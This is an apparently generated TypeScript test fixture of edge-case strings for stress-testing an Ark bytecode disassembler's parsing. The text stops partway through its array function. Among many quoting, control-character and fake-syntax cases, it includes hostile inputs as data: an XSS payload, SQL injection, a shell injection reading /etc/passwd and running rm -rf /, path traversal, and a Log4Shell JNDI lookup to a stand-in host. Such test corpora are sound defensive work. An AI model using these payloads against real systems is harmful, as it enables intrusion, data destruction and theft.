// 本文件由 tools/gen_string_stress.py 生成，勿手改。
// 字符串边界语料：把引号/换行/回车/代理对/伪造 ark_disasm 文本结构等全部边界形态
// 同时压入三个解析面：方法体指令操作数（lda.str / stobjbyname）、字面量缓冲
// （createarraywithbuffer / createobjectwithbuffer 的键与值）、字符串池。
// 共 186 个用例；预期故障模式与实证依据见 tools/gen_string_stress.py 文档字符串。
export const STRING_STRESS_CASES: number = 186;

// 面①：方法体 lda.str 操作数（含全部用例）。
export function stringStressAt(i: number): string {
  if (i === 0) { return "The quick brown fox jumps"; }
  if (i === 1) { return ""; }
  if (i === 2) { return " "; }
  if (i === 3) { return "   "; }
  if (i === 4) { return "  padded  "; }
  if (i === 5) { return "]"; }
  if (i === 6) { return "a\u0000b"; }
  if (i === 7) { return "]}"; }
  if (i === 8) { return "] ] ]"; }
  if (i === 9) { return "\""; }
  if (i === 10) { return "\"\""; }
  if (i === 11) { return "\"\"\""; }
  if (i === 12) { return "'"; }
  if (i === 13) { return "`"; }
  if (i === 14) { return "\"'`"; }
  if (i === 15) { return "say \"hi\" ok"; }
  if (i === 16) { return "it's `tick`"; }
  if (i === 17) { return "\"quoted\""; }
  if (i === 18) { return "{\"k\":\"v\",\"n\":[1,2]}"; }
  if (i === 19) { return "select * from t where name='a''b' and c=\"d\""; }
  if (i === 20) { return "<a href=\"x\" onclick='go(\"y\")'>"; }
  if (i === 21) { return "a\"\nb'\nc`"; }
  if (i === 22) { return "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\""; }
  if (i === 23) { return "back\\slash"; }
  if (i === 24) { return "double\\\\slash"; }
  if (i === 25) { return "end\\"; }
  if (i === 26) { return "a\\nb"; }
  if (i === 27) { return "a\\\"b"; }
  if (i === 28) { return "C:\\Users\\koki\\temp"; }
  if (i === 29) { return "\\\\server\\share\\"; }
  if (i === 30) { return "\\u0041"; }
  if (i === 31) { return "\\x41"; }
  if (i === 32) { return "\\${jndi}"; }
  if (i === 33) { return "(\\d+)\\s*\"[x]\""; }
  if (i === 34) { return "\\n\\r\\t\\\"\\\\"; }
  if (i === 35) { return "line1\nline2"; }
  if (i === 36) { return "\nstart"; }
  if (i === 37) { return "end\n"; }
  if (i === 38) { return "\n\n\n"; }
  if (i === 39) { return "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n"; }
  if (i === 40) { return "cr\rmid"; }
  if (i === 41) { return "\rstart"; }
  if (i === 42) { return "end\r"; }
  if (i === 43) { return "crlf\r\nend"; }
  if (i === 44) { return "lf\n\rend"; }
  if (i === 45) { return "a\r\n\r\nb"; }
  if (i === 46) { return "a\n\t b\r\n c\n"; }
  if (i === 47) { return "a\tb"; }
  if (i === 48) { return "a\\tb"; }
  if (i === 49) { return "a\u0001b"; }
  if (i === 50) { return "a\\x01b"; }
  if (i === 51) { return "a\u2028b"; }
  if (i === 52) { return "a\u2029b"; }
  if (i === 53) { return "a\ufeffb"; }
  if (i === 54) { return "a\u007fb"; }
  if (i === 55) { return "a\\u2028b"; }
  if (i === 56) { return "\u0007\u000c\u000b"; }
  if (i === 57) { return "\u001b[0m\u001b[31mRED\u001b[0m"; }
  if (i === 58) { return "中文测试汉字标点"; }
  if (i === 59) { return "emoji😀🀄𝕏末"; }
  if (i === 60) { return "x\ud800y"; }
  if (i === 61) { return "x\udfffy"; }
  if (i === 62) { return "\ud83d\ude00pair"; }
  if (i === 63) { return "énäive"; }
  if (i === 64) { return "a b"; }
  if (i === 65) { return "a​b‍c"; }
  if (i === 66) { return "evil‮drow-ssa‬"; }
  if (i === 67) { return "“”‘’「」『』【】"; }
  if (i === 68) { return "中“文”\n日『本』"; }
  if (i === 69) { return "multi\n[offset:0x1, name_value:x]tail"; }
  if (i === 70) { return "\n[offset:0x9, name_value:zz]"; }
  if (i === 71) { return "head\n[offset:0x0, name_value:]"; }
  if (i === 72) { return "[offset:0x123, name_value:sink]"; }
  if (i === 73) { return "name_value:v"; }
  if (i === 74) { return "a, b: c, d: e"; }
  if (i === 75) { return "fake\n0 0x590 { 2 [ string:\"x\", null_value:0, ]}"; }
  if (i === 76) { return "fake\n1 0x1 { "; }
  if (i === 77) { return "fake\n2 0x2 { 3 [ string:\"m\", method:f, method_affiliate:0, ]}"; }
  if (i === 78) { return "fake\n999999 0xdeadbeef { 999 [ "; }
  if (i === 79) { return "fake\nL_ESSlotNumberAnnotation:"; }
  if (i === 80) { return "L_ESSlotNumberAnnotation:"; }
  if (i === 81) { return "pre\n\tsta v0\n\tldai 0x0"; }
  if (i === 82) { return "x\n\tlda.str \"y\""; }
  if (i === 83) { return "x\n\tldobjbyname 0x0, \"k\""; }
  if (i === 84) { return "pre\n.function any evil(any a0) {"; }
  if (i === 85) { return "pre\n.language ECMAScript"; }
  if (i === 86) { return "body\n}\nafter"; }
  if (i === 87) { return "sec\n# STRING ===================="; }
  if (i === 88) { return "sec\n# RECORDS ===================="; }
  if (i === 89) { return "sec\n# ===================="; }
  if (i === 90) { return "sec\n# LITERALS\n# METHODS"; }
  if (i === 91) { return "x=====================y"; }
  if (i === 92) { return "# LITERALS"; }
  if (i === 93) { return "rec\n.record evil {\n}"; }
  if (i === 94) { return "fld\n.field any x, <0x1>"; }
  if (i === 95) { return "q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,"; }
  if (i === 96) { return "汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉汉"; }
  if (i === 97) { return "abababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababababab"; }
  if (i === 98) { return "a"; }
  if (i === 99) { return "a"; }
  if (i === 100) { return "a "; }
  if (i === 101) { return " a"; }
  if (i === 102) { return "a\n"; }
  if (i === 103) { return "aa"; }
  if (i === 104) { return "<img src=x onerror=\"alert('XSS')\">"; }
  if (i === 105) { return "1' OR '1'='1' --"; }
  if (i === 106) { return "; cat /etc/passwd & rm -rf /"; }
  if (i === 107) { return "../../etc/passwd%00.png"; }
  if (i === 108) { return "${jndi:ldap://evil.x/a}"; }
  if (i === 109) { return "eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjMifQ.SflKxwRJSMeKKF2QT4fwpM"; }
  if (i === 110) { return "https://x.io/a?b=1&c=\"d\"&e='f'"; }
  if (i === 111) { return "Failed %{public}s cause: %{public}s"; }
  if (i === 112) { return "<?xml v=\"1.0\"?><n a=\"b'c\"/>"; }
  if (i === 113) { return "k: \"v\"\n  - 'w'\n# cmt"; }
  if (i === 114) { return "HTTP/1.1 200 OK\r\nSet-Cookie: a=\"b\"\r\n\r\nbody"; }
  if (i === 115) { return "# Title\n> quote \"x\"\n- item `y`\n"; }
  if (i === 116) { return "0K5t9qQ2Xz7vBn4hR8wL3jF6uM1cA7dE5gT+4iY0sP=="; }
  if (i === 117) { return "\", lead"; }
  if (i === 118) { return "trail ,\""; }
  if (i === 119) { return "a ,\" b"; }
  if (i === 120) { return "\","; }
  if (i === 121) { return "\"\"\"\""; }
  if (i === 122) { return "\"\"\"\"\""; }
  if (i === 123) { return "\"\"\"\"\"\""; }
  if (i === 124) { return "\"\\\""; }
  if (i === 125) { return "\"\"\\\"\"\""; }
  if (i === 126) { return "\"\\\\\""; }
  if (i === 127) { return "pre\njump_label_0:"; }
  if (i === 128) { return "x\njump_label_1:\npost"; }
  if (i === 129) { return "body\n.catchall\nmore"; }
  if (i === 130) { return "pre\n.function any n.e.f(any a0) <static> {"; }
  if (i === 131) { return "pre\n.function any f(any a0, any a1) {"; }
  if (i === 132) { return "lab\n\tldai 0x1\n\tjnez jump_label_9"; }
  if (i === 133) { return "x\n\tlda.str \"in\\\"ner\"\ny"; }
  if (i === 134) { return "x\n\tlda.str \"\"\ny"; }
  if (i === 135) { return "pre\n\tsta v0\n\tldai 0x2a\npost"; }
  if (i === 136) { return "x\n\tldobjbyname 0x0, \"code\"\ny"; }
  if (i === 137) { return "x\n\tstobjbyname 0x1, \"a, b\"\ny"; }
  if (i === 138) { return "x\n\tcallthis1 0x7, v13, v14\ny"; }
  if (i === 139) { return "x\n\tjnez jump_label_3\n\tjmp jump_label_4\ny"; }
  if (i === 140) { return "x\njump_label_5:\ny"; }
  if (i === 141) { return "x\n\tthrow.undefinedifholewithname \"h\"\ny"; }
  if (i === 142) { return "x\n\tnewlexenv 0x3\ny"; }
  if (i === 143) { return "x\n\tmov v0, a0\ny"; }
  if (i === 144) { return "x\n\treturnundefined\npost"; }
  if (i === 145) { return "x\n\tldexternalmodulevar 0x1\ny"; }
  if (i === 146) { return "x\n\ttryldglobalbyname 0x4, \"JSON\"\ny"; }
  if (i === 147) { return "x\n\tcreateobjectwithbuffer 0x6, { 4 [ string:\"k\", string:\"v\", ]}\ny"; }
  if (i === 148) { return "x\n.catchall:begin, end, target\ny"; }
  if (i === 149) { return "x\n\twide.ldlexvar 0x80, 0x81\ny"; }
  if (i === 150) { return "x\n\tsuspendgenerator 0x0, v0, v1\ny"; }
  if (i === 151) { return "x\n  string:\"fake\", i32:42, ]}\ny"; }
  if (i === 152) { return "a\n\tsta v0\n\tlda v0\n\tjnez jump_label_9\njump_label_9:\n\treturnundefined\nz"; }
  if (i === 153) { return "\u0002"; }
  if (i === 154) { return "\u0003"; }
  if (i === 155) { return "\u0004"; }
  if (i === 156) { return "\u0005"; }
  if (i === 157) { return "\u0006"; }
  if (i === 158) { return "\u0007"; }
  if (i === 159) { return "\u0008"; }
  if (i === 160) { return "\t"; }
  if (i === 161) { return "\n"; }
  if (i === 162) { return "\u000b"; }
  if (i === 163) { return "\u000c"; }
  if (i === 164) { return "\u000e"; }
  if (i === 165) { return "\u000f"; }
  if (i === 166) { return "\u0010"; }
  if (i === 167) { return "\u0011"; }
  if (i === 168) { return "\u0012"; }
  if (i === 169) { return "\u0013"; }
  if (i === 170) { return "\u0014"; }
  if (i === 171) { return "\u0015"; }
  if (i === 172) { return "\u0016"; }
  if (i === 173) { return "\u0017"; }
  if (i === 174) { return "\u0018"; }
  if (i === 175) { return "\u0019"; }
  if (i === 176) { return "\u001a"; }
  if (i === 177) { return "\u001b"; }
  if (i === 178) { return "\u001c"; }
  if (i === 179) { return "\u001d"; }
  if (i === 180) { return "\u001e"; }
  if (i === 181) { return "\u001f"; }
  if (i === 182) { return ""; }
  if (i === 183) { return "{\"k\":\"v\"}\n# STRING ====================\n😀tail"; }
  if (i === 184) { return "multi\n[offset:0x1, name_value:x]\r\nevil‮x‬"; }
  if (i === 185) { return "a\"b\\c\td\ne\rf\"g`h"; }
  return "string-stress-fallback";
}

// 面②a：数组字面量缓冲（含全部用例）。
export function stringStressArray(): Array<string> {
  return [
    "The quick brown fox jumps",
    "",
    " ",
    "   ",
    "  padded  ",
    "]",
    "a\u0000b",
    "]}",
    "] ] ]",
    "\"",
    "\"\"",
    "\"\"\"",
    "'",
    "`",
    "\"'`",
    "say \"hi\" ok",
    "it's `tick`",
    "\"quoted\"",
    "{\"k\":\"v\",\"n\":[1,2]}",
    "select * from t where name='a''b' and c=\"d\"",
    "<a href=\"x\" onclick='go(\"y\")'>",
    "a\"\nb'\nc`",
    "\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"\"",
    "back\\slash",
    "double\\\\slash",
    "end\\",
    "a\\nb",
    "a\\\"b",
    "C:\\Users\\koki\\temp",
    "\\\\server\\share\\",
    "\\u0041",
    "\\x41",
    "\\${jndi}",
    "(\\d+)\\s*\"[x]\"",
    "\\n\\r\\t\\\"\\\\",
    "line1\nline2",
    "\nstart",
    "end\n",
    "\n\n\n",
    "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n",
    "cr\rmid",
    "\rstart",
    "end\r",
    "crlf\r\nend",
    "lf\n\rend",
    "a\r\n\r\nb",
    "a\n\t b\r\n c\n",
    "a\tb",
    "a\\tb",
    "a\u0001b",
    "a\\x01b",
    "a\u2028b",
    "a\u2029b",
    "a\ufeffb",
    "a\u007fb",
    "a\\u2028b",
    "\u0007\u000c\u000b",
    "\u001b[0m\u001b[31mRED\u001b[0m",
    "中文测试汉字标点",
    "emoji😀🀄𝕏末",
    "x\ud800y",
    "x\udfffy",
    "\ud83d\ude00pair",
    "énäive",
    "a b",
    "a​b‍c",
    "evil‮drow-ssa‬",
    "“”‘’「」『』【】",
    "中“文”\n日『本』",
    "multi\n[offset:0x1, name_value:x]tail",
    "\n[offset:0x9, name_value:zz]",
    "head\n[offset:0x0, name_value:]",
    "[offset:0x123, name_value:sink]",
    "name_value:v",
    "a, b: c, d: e",
    "fake\n0 0x590 { 2 [ string:\"x\", null_value:0, ]}",
    "fake\n1 0x1 { ",
    "fake\n2 0x2 { 3 [ string:\"m\", method:f, method_affiliate:0, ]}",
    "fake\n999999 0xdeadbeef { 999 [ ",
    "fake\nL_ESSlotNumberAnnotation:",
    "L_ESSlotNumberAnnotation:",
    "pre\n\tsta v0\n\tldai 0x0",
    "x\n\tlda.str \"y\"",
    "x\n\tldobjbyname 0x0, \"k\"",
    "pre\n.function any evil(any a0) {",
    "pre\n.language ECMAScript",
    "body\n}\nafter",
    "sec\n# STRING ====================",
    "sec\n# RECORDS ====================",
    "sec\n# ====================",
    "sec\n# LITERALS\n# METHODS",
    "x=====================y",
    "# LITERALS",
    "rec\n.record evil {\n}",
    "fld\n.field any x, <0x1>",
    "q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,q\"b\\n\tr,",
